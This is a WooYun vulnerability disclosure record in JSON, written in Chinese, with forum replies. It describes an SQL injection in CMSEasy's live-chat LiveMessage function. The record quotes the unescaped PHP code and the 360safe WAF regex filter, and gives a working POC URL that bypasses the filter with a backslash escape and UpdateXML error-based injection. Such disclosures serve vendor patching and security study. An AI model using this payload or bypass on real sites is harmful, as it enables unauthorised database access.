{"id": 47584, "wybug_id": "wooyun-2014-080260", "wybug_title": "cmseasy 最新版SQLl注入（第八次绕WAF）", "wybug_corp": "cmseasy", "wybug_author": "路人甲", "wybug_date": "2014-10-22 11:44", "wybug_open_date": "2015-01-20 11:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向公众公开  简要描述： 继续绕啊绕啊 详细说明：  cmseasy 终于更新了 看了下对比文件，那修复~~~无法吐槽~~~~\nfunction LiveMessage($a) {    global $db;    $sessionid = $_SESSION['sessionid'];    $name = addslashes(htmlspecialchars($a['name']));    $email = addslashes(htmlspecialchars($a['email']));    $country = htmlspecialchars($a['country']);    $phone = htmlspecialchars($a['phone']);    $departmentid = htmlspecialchars($a['departmentid']);    $message = htmlspecialchars($a['message']);    $timestamp = time();    $ip = $_SERVER['REMOTE_ADDR'];    $sql = \"INSERT INTO `chat` (`sessionid`,`name`,`email`,`phone`,`departmentid`,`message`,`timestamp`,`ip`,`status`) VALUES('\" . $sessionid . \"','\" . $name . \"','\" . $email . \"','\" . $phone . \"','\" . $departmentid . \"','\" . $message . \"','\" . $timestamp . \"','\" . $ip . \"','2')\";    $db->query($sql);    $sql = \"DELETE FROM `sessions` WHERE `id`='\" . $sessionid . \"'\";    $db->query($sql);    $text = \"<?php echo $lang[shout_success]?>\\n\";    $objResponse = new xajaxResponse('utf-8');    $objResponse->addAssign('content', 'innerHTML', $text);    $objResponse->redirect('../', 5);    return $objResponse;}\n$a是可以通过前端get或者post传入。只修复了name和email，不修复下面几个变量 这是给我们留着漏洞挖么！！！！！！！然后开始测试，擦 发现360safe被更新了，修复增加了检测单引号！ 这不坑爹么，只要输入单引号全盘否定！\n$getfilter = \"\\\\<.+javascript:window\\\\[.{1}\\\\\\\\x|<.*=(&#\\\\d+?;?)+?>|<.*(data|src)=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\()|<[a-z]+?\\\\b[^>]*?\\\\bon([a-z]{4,})\\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?|`.*?`)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?|`.*?`.*?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|`.*?`.*?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|`.*?`.*?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)|\\\\/\\\\*.*?\\\\*\\\\/|'\";\n但是还可以用转义符，接下来就是开始绕啊绕啊：POC:http://192.168.152.160:8080/cmseasy/celive/live/header.php?xajax=LiveMessage&xajaxargs[0][phone]=\\&xajaxargs[0][departmentid]=,(UpdateXML(1,CONCAT(0x5b,user(),0x5d),1)),6,7,8)%23另外官网没测试成功，好像有安全狗\n\n   漏洞证明：  \n\n   修复方案：  全盘否定单引号 这也太坑了！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-10-24 11:03 厂商回复： 修正 最新状态： 2014-10-24：感谢提醒~~一时大意了~~  ", "replys": "漏洞评价：\n评论\n     2014-10-22 11:56 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  绕waf哪家强？    \n     2014-10-22 11:57 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @疯狗 山东找蓝翔    \n     2014-10-22 12:03 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  我知道注入点 是哪里 你可真快啊 还是赞一个！！！！    \n     2014-10-22 12:23 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  楼主是新东方还是蓝翔毕业的啊。太淫荡了。    \n     2014-10-22 13:16 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  绕过了八次，也是醉了。。    \n     2014-10-22 13:17 |    \t\tkenan@ \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | php ,asp)\t\t \n  绕过了8次？这    \n     2014-10-22 13:17 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  擦，我才饶了4次，你赢了    \n     2014-10-22 13:49 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  我也醉了。。。@cmseasy 我帮你写补丁吧    \n     2014-10-22 13:49 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  第八个工程师已被开除。    \n     2014-10-22 14:32 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  传说中的拔进拔出，哦不对，八进八出    \n     2014-10-24 11:08 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  1，cmseasy真的生气了    \n     2014-10-24 11:11 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  1是什么情况？    \n     2014-10-24 17:38 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @phith0n 程序员的自尊之类的东西吧,毕竟修8次都修不好暴露的不是编程功底或安全意识，而是智商。    \n     2014-11-13 11:19 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然给低    \n     2014-11-13 11:28 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  眼睁睁看着饶了八次  厂商也是醉了    \n     2014-11-13 14:20 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  不忍直视    \n     2014-12-11 20:13 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  @mramydnei 看透不说透。。。。    \n     2014-12-11 20:50 |    \t\tFenQing \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | FenQing)\t\t \n  楼主该不会还想来第八第九吧    \n     2015-01-20 15:15 |    \t\t用来怀念 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 不是什么人都一定要去拥有，有的东西最好用...)\t\t \n  程序员绝壁已被开除！！！    \n     2015-01-20 16:07 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  @mramydnei 说这话就有点过了    \n     2015-01-20 16:15 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @BeenQuiver 嗯，可能有点伤人。但是我觉得会比较接近事实真相    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}